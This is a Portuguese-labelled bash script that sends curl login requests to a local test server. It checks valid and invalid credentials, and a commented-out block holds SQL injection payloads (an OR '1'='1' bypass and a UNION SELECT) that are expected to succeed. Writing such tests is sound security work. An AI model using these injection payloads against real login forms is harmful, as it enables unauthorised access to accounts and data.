#!/bin/bash
BASE_URL="http://localhost:8080"

echo -e "\n\033[1;34m=== TESTES VÁLIDOS ===\033[0m"

declare -a VALID_TESTS=(
    "Login correto" "user=admin&pass=password" "success"
    "Senha errada" "user=admin&pass=errada" "fail"
    "Usuário inexistente" "user=naoexiste&pass=123" "fail"
)

for ((i=0; i<${#VALID_TESTS[@]}; i+=3)); do
    echo -e "\n\033[1;36mTEST: ${VALID_TESTS[$i]}\033[0m"
    echo "Payload: ${VALID_TESTS[$i+1]}"
    curl -s -X POST "$BASE_URL" -d "${VALID_TESTS[$i+1]}" | grep "bem-sucedido\|falhou" | xargs -0 echo -e "\033[1;32mResultado \033[0m"
    sleep 1
done

# echo -e "\n\033[1;34m=== TESTES DE SQL INJECTION ===\033[0m"

# declare -a SQLI_TESTS=(
#     "Bypass básico" "user=' OR '1'='1' -- &pass=any" "success"
#     "Union Attack" "user=' UNION SELECT 1,2,3 -- &pass=any" "success" 
#     "Sintaxe inválida" "user=' OR 1=1" "fail"
# )

# for ((i=0; i<${#SQLI_TESTS[@]}; i+=3)); do
#     echo -e "\n\033[1;31mTEST: ${SQLI_TESTS[$i]}\033[0m"
#     echo "Payload: ${SQLI_TESTS[$i+1]}"
#     curl -s -X POST "$BASE_URL" -d "${SQLI_TESTS[$i+1]}" | grep "bem-sucedido\|falhou\|Erro" | xargs -0 echo -e "\033[1;33mResultado \033[0m"
#     sleep 2
# done
